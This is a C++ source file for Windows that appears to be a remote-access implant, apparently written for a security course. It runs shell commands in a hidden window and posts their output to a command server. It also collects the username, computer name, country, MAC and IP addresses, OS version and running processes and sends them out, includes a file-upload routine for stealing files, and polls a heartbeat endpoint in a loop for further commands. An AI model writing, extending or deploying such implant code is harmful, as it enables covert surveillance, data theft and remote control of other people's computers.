#include<iostream>
#include <iomanip>
#include<Windows.h>
#include<WinInet.h>
#include <tchar.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
using namespace std;

#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "IPHLPAPI.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))


std::string encode(string key, string clear) {
	string enc = "";
	char key_c;
	string enc_c;
	int placeholder;

	for (int i = 0; i < clear.length(); i++) {
		key_c = key[i % key.length()];
		placeholder = int(clear[i]) + int(key_c);
		enc_c = (placeholder % 127);
		enc.append(enc_c);
	}
	return enc;
}

std::string decode(string key, string enc) {
	string dec = "";
	char key_c;
	string dec_c;
	int placeholder;

	for (int i = 0; i < enc.length(); i++) {
		key_c = key[i % key.length()];
		placeholder = 127 + int(enc[i]) - int(key_c);
		dec_c = (placeholder % 127);
		dec.append(dec_c);
	}
	return dec;
}


std::string send_enc(std::string key) {
	const char* IP = "127.0.0.1";
	const int PORT = 5000;

	string clear = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	string result = encode(key, clear);

	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hConnectCMD = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequestCMD = HttpOpenRequestA(hConnectCMD, "POST", "/decode", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	BOOL reqSuccess =  HttpSendRequestA(hRequestCMD, NULL, NULL, (LPVOID)result.c_str(), result.length());
	if (reqSuccess) {
		DWORD receivedData = 0;
		DWORD chunkSize = 2048;
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hRequestCMD, &chunk[0], chunkSize, &receivedData) && receivedData)
		{
			chunk.resize(receivedData);
			buf += chunk;
		}
		return decode(key, buf);
	}

}


//Uploads file to server
//Params: handle for internet, path of file to upload, server ip, port 
BOOL doFileUpload(HANDLE hInternet, char* filepath, char* ip, int port) {
	//https://stackoverflow.com/questions/6407755/how-to-send-a-zip-file-using-wininet-in-my-vc-application
	char hdrs[] = "Content-Type: multipart/form-data; boundary=CSEC476";
	char head[] = "--CSEC476\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n";
	char tail[] = "\r\n--CSEC476--\r\n";
	char data[2048] = {};
	DWORD bytesWritten = 0;
	DWORD bytesRead = 0;
	HANDLE hFile = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile)
		return FALSE;
	DWORD dataSize = GetFileSize(hFile, NULL);

	HANDLE hConnect = InternetConnectA(hInternet, ip, port, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	HttpAddRequestHeadersA(hRequest, hdrs, -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
	
	INTERNET_BUFFERSA bufferIn;
	memset(&bufferIn, 0, sizeof(INTERNET_BUFFERSA));
	bufferIn.dwStructSize = sizeof(INTERNET_BUFFERS);
	bufferIn.dwBufferTotal = strlen(head) + dataSize + strlen(tail);

	HttpSendRequestExA(hRequest, &bufferIn, NULL, HSR_INITIATE, 0);
	InternetWriteFile(hRequest, (const void*)head, strlen(head), &bytesWritten);
	do {
		if (!ReadFile(hFile, &data, sizeof(data), &bytesRead, NULL)) {
			HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
			return FALSE;
		}
		cout << bytesRead << "\n";
		InternetWriteFile(hRequest, (const void*)data, bytesRead, &bytesWritten);
		cout << bytesWritten << "\n";
	} while (bytesRead == sizeof(data));
	InternetWriteFile(hRequest, (const void*)tail, strlen(tail), &bytesWritten);
	HttpEndRequest(hRequest, NULL, HSR_INITIATE, 0);
	return TRUE;
}


//Executes commands and stores the output in string buffer. Timeout = MAX_TIMEOUT (prevents non-returning commands from breaking code)
//Returns string buffer
std::string execCmd(char* cmd, DWORD MAX_TIME)
{
	std::string output;
	HANDLE hPipeRead;
	HANDLE hPipeWrite;

	SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES) };
	saAttr.bInheritHandle = TRUE; 
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hPipeRead, &hPipeWrite, &saAttr, 0))
		return output;

	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.hStdOutput = hPipeWrite;
	si.hStdError = hPipeWrite;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi = { 0 };

	BOOL fSuccess = CreateProcessA(NULL, cmd, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	if (!fSuccess)
	{
		CloseHandle(hPipeWrite);
		CloseHandle(hPipeRead);
		return output;
	}

	SYSTEMTIME startTime, currentTime;
	FILETIME startFTime, currentFTime;
	GetSystemTime(&startTime);
	GetSystemTime(&currentTime);
	SystemTimeToFileTime(&startTime, &startFTime);
	SystemTimeToFileTime(&currentTime, &currentFTime);
	

	BOOL bProcessEnded = FALSE;
	while (!bProcessEnded && currentFTime.dwLowDateTime < startFTime.dwLowDateTime + MAX_TIME){
		GetSystemTime(&currentTime);
		SystemTimeToFileTime(&currentTime, &currentFTime);
		bProcessEnded = WaitForSingleObject(pi.hProcess, 250) == WAIT_OBJECT_0;

		while(currentFTime.dwLowDateTime < startFTime.dwLowDateTime + MAX_TIME) {
			GetSystemTime(&currentTime);
			SystemTimeToFileTime(&currentTime, &currentFTime);
			char buf[2048];
			DWORD dwRead = 0;
			DWORD dwAvail = 0;

			if (!PeekNamedPipe(hPipeRead, NULL, 0, NULL, &dwAvail, NULL))
				break;
			if (!dwAvail)
				break;
			if (!ReadFile(hPipeRead, buf, min(sizeof(buf) - 1, dwAvail), &dwRead, NULL) || !dwRead)
				break;

			buf[dwRead] = 0;
			output += buf;
		}
	} 
	CloseHandle(hPipeWrite);
	CloseHandle(hPipeRead);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return output;
}



// Takes in request handle, returns string based on response
std::string sendRequestGetResponse(HANDLE hRequest) {
	BOOL reqSuccess = HttpSendRequestA(hRequest, NULL, NULL, NULL, NULL);
	if (reqSuccess) {
		DWORD receivedData = 0;
		DWORD chunkSize = 2048;
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hRequest, &chunk[0], chunkSize, &receivedData) && receivedData)
		{
			chunk.resize(receivedData);
			buf += chunk;
		}
		return buf;
	}
	return "Error";
}


std::string getOSInfo() {
	std::string str_data;
	char value[256];
	DWORD BufferSize = 255;
	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
	str_data += value;
	str_data += " ";
	RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "DisplayVersion", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
	str_data += value;
	return str_data;
}

//Attempts to get public IP of user by reaching out to ifconfig.me
std::string getPublicIP(HANDLE hInternet) {
	HANDLE hConnect = InternetConnectA(hInternet, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	std::string resp = sendRequestGetResponse(hRequest);
	if (hRequest)
		InternetCloseHandle(hRequest);
	if (hConnect)
		InternetCloseHandle(hConnect);
	return resp;
}


//Gets list of current running processes and converts to string
std::string getProcToStr() {
	std::string proclst;
	HANDLE hTH32 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 procEntry;
	procEntry.dwSize = sizeof(PROCESSENTRY32);
	Process32First(hTH32, &procEntry);
	do
	{
		wstring ws(procEntry.szExeFile);
		string str(ws.begin(), ws.end());
		proclst += str;
		proclst += ":";
		char buf[UNLEN + 1];
		DWORD len = UNLEN + 1;
		_itoa_s(procEntry.th32ProcessID, buf, 10);
		buf[UNLEN] = 0;
		proclst += buf;
		proclst += "&";
	} while (Process32Next(hTH32, &procEntry));
	return proclst;
}


std::string getNetworkInfo() {
	UINT i;
	std::string nwInfo;
	// https://docs.microsoft.com/en-us/windows/win32/api/iphlpapi/nf-iphlpapi-getadaptersinfo
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			for (i = 0; i < pAdapter->AddressLength; i++) {
				if (i == (pAdapter->AddressLength - 1)) {
					char buf[UNLEN + 1];
					_itoa_s((int)pAdapter->Address[i], buf, 16);
					if ((int)pAdapter->Address[i] < 0x10)
						nwInfo += "0";
					nwInfo += buf;
					nwInfo += ",";
					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "\n";
				}
				else {
					char buf[UNLEN + 1];
					_itoa_s((int)pAdapter->Address[i], buf, 16);
					if ((int)pAdapter->Address[i] < 0x10)
						nwInfo += "0";
					buf[UNLEN] = 0;
					nwInfo += buf;
					nwInfo += "-";
					cout << std::hex << setfill('0') << setw(2) << (int)pAdapter->Address[i] << "-";
				}

			}
			nwInfo += pAdapter->IpAddressList.IpAddress.String;
			nwInfo += ",";
			pAdapter = pAdapter->Next;
		}
	}
	else {
		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
	return nwInfo;
}

//Gathers all info from devices and converts to string
//Currently includes: public IP, username, computer name, geolocation, memory amount, IP/MAC addresses
std::string gatherInfo(HANDLE hInternet) {
	std::string allInfo;
	allInfo += getPublicIP(hInternet);
	allInfo += "&";

	char username[UNLEN + 1];
	DWORD len = UNLEN + 1;

	BOOL getUserSuccess = GetUserNameA(username, &len);
	if (getUserSuccess) {
		cout << username << "\n";
		allInfo += username;
		allInfo += "&";
	}
	else {
		cout << "unsuccessful" << "\n";
	}

	char computername[UNLEN + 1];
	DWORD len2 = UNLEN + 1;

	BOOL getComputerNameSuccess = GetComputerNameA(computername, &len2);
	if (getComputerNameSuccess) {
		cout << computername << "\n";
		allInfo += computername;
		allInfo += "&";
	}
	else {
		cout << "unsuccessful" << "\n";
	}

	GEOID g = GetUserGeoID(GEOCLASS_NATION);
	char iso2[UNLEN + 1];
	GetGeoInfoA(g, GEO_ISO2, iso2, UNLEN + 1, 0);
	cout << g << " " << iso2 << "\n";
	allInfo += iso2;
	allInfo += "&";

	ULONGLONG memqty = 0;
	GetPhysicallyInstalledSystemMemory(&memqty);
	char memqtystr[UNLEN + 1];
	_ui64toa_s(memqty, memqtystr, UNLEN, 10);
	allInfo += memqtystr;
	allInfo += "&";
	allInfo += getNetworkInfo();
	allInfo += "&";
	allInfo += getOSInfo();
	return allInfo;
}


int main() {
	const char* IP = "127.0.0.1";
	const int PORT = 5000;
	const int SLEEPTIME = 1001;
	const std::string key = "CSEC476";



	PCTSTR rgpszAcceptTypes[] = { _T("text/*"), NULL };
	HANDLE hInternet = InternetOpenA("test1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
	HANDLE hConnect = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);

	const char* pth = "C:\\Users\\shell\\Downloads\\scada_5.8.2_full_en.zip";
	const char* cmd = "cmd.exe /c dir C:\\";
	//const char* cmd = "cmd.exe /c ping google.com";

	DWORD MAX_CMD_TIME = 5 * (10000000);
	std::string cmdout = execCmd((char*)cmd, MAX_CMD_TIME);
	//cout << execCmd((char*)cmd, MAX_CMD_TIME) << "\n";
	//cout << execCmd((char*)"cmd.exe /c ping google.com", MAX_CMD_TIME) << "\n";
	//cout << execCmd((char*)"cmd.exe /c whoami", MAX_CMD_TIME) << "\n";
	//cout << execCmd((char*)"cmd.exe /c net user", MAX_CMD_TIME) << "\n";
	//cout << execCmd((char*)"cmd.exe /c powershell.exe", MAX_CMD_TIME) << "\n";

	//Sends cmd out to server
	HANDLE hConnectCMD = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequestCMD = HttpOpenRequestA(hConnectCMD, "POST", "/out", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	HttpSendRequestA(hRequestCMD, NULL, NULL, (LPVOID)cmdout.c_str(), cmdout.size());


	std::string dc = send_enc(key);
	cout << dc << "\n";
	//return 0;
	//doFileUpload(hInternet, (char*)pth, (char*)IP, PORT);


	//Sends Process List to Server
	std::string procInfo = getProcToStr();
	HANDLE hConnectPS = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequestPS = HttpOpenRequestA(hConnectPS, "POST", "/ps", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	HttpSendRequestA(hRequestPS, NULL, NULL, (LPVOID)procInfo.c_str(), procInfo.size());

	//Sends all other info to server
	std::string allInfo = gatherInfo(hInternet);
	HANDLE hConnect2 = InternetConnectA(hInternet, IP, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	HANDLE hRequest2 = HttpOpenRequestA(hConnect2, "POST", "/info", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	BOOL reqSuccess2 = HttpSendRequestA(hRequest2, NULL, NULL, (LPVOID)allInfo.c_str(), allInfo.size());
	if (reqSuccess2) {
		cout << "success" << "\n";
	}
	else {
		cout << GetLastError();
	}

	
	while (true) {
		HANDLE hRequest = HttpOpenRequestA(hConnect, "POST", "/heartbeat", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
		cout << sendRequestGetResponse(hRequest) << "\n";
		//Process request here. If first part of string is a 1, do this... 2 do this... etc.
		HttpEndRequestA(hRequest, NULL, NULL, NULL);
		Sleep(SLEEPTIME);
	}

	return 0;
}